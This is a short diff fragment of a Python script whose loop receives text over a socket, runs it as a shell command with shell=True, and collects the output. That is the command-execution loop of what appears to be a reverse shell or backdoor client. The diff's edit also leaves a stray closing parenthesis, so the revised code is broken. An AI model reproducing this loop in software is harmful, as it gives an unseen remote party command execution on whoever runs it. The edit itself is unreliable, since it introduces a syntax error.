@@ -13,8 +13,8 @@ while 1:
     data = s.recv(1024)
     if data == 'close': break
 
-    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.P
-                            PIPE)
+    proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+                           )
 
     stdoutput = proc.stdout.read() + proc.stderr.read()
 
